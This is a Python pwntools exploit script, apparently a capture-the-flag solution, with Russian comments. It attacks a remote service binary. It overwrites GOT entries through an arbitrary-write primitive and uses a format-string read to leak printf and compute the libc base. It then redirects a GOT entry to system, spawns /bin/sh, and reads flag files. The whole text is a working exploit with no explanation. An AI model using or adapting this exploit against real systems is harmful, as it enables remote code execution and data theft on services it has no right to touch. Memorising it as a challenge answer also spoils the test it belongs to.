#!/usr/bin/env python3
from pwn import *
import time

context.binary = ELF("./www2.elf", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = "info"

HOST, PORT = "109.233.56.90", 11656

MAIN = 0x4010a0
PRINTF_PLT = 0x401050
GOT_PUTS = 0x404018
GOT_PRINTF = 0x404028
DEC = str(GOT_PUTS).encode()

io = remote(HOST, PORT)

def wp(value):
    io.recvuntil(b"Enter data(8 bytes): ")
    io.send(p64(value))
    io.recvuntil(b"Enter address(decimal): ")
    io.sendline(DEC)

def buf32(x):
    return x.ljust(0x20, b"\x00")

wp(MAIN)
wp(MAIN)
wp(PRINTF_PLT)

io.recvuntil(b"your data:")
io.send(buf32(b"%8$s" + b"A"*12 + p64(GOT_PRINTF)))
leak = io.recvn(6)
printf_addr = u64(leak.ljust(8, b"\x00"))
libc.address = printf_addr - libc.sym.printf
system = libc.sym.system
assert libc.address % 0x1000 == 0, "база не выровнена — лик кривой"
log.success("printf = %#x", printf_addr)
log.success("libc base = %#x", libc.address)
log.success("system = %#x", system)
time.sleep(0.3)

io.send(buf32(b"%160c%8$hhn" + b"A"*5 + p64(GOT_PUTS)))
time.sleep(0.3)

io.send(buf32(b"A"))
time.sleep(0.3)
wp(system)
time.sleep(0.3)

io.send(buf32(b"/bin/sh\x00"))
log.info("отправили /bin/sh, пробуем шелл...")
io.sendline(b"id; echo PWNED; cat /flag* 2>/dev/null; cat flag* 2>/dev/null")
print(io.recvrepeat(3).decode(errors="replace"))
io.interactive()
